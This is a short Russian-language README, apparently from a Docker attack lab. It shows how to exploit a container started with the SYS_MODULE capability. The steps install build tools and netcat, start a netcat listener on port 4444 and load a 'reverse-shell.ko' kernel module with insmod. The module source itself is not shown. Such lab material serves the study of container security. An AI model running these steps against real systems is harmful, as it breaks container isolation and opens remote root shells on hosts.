Ставим зависимости в контейнер
```bash
apt install make
apt install -y vim # or any other editor
apt install -y netcat
apt install -y gcc
# Container should run with the same operating system version as the host.
# Get the kernel version by ‘uname -r’
version=$(uname -r)
apt install -y linux-headers-$version
apt install -y kmod
apt install net-tools
```

Запуск уязвимого контейнера
```bash
docker run -it --cap-add=SYS_MODULE ubuntu:latest bash
```

Атака
```bash
git clone <this repo>
cd docker-attacks/attack_4 - Kernel Module injection
make
nc -lnvp 4444 & /usr/sbin/insmod reverse-shell.ko
```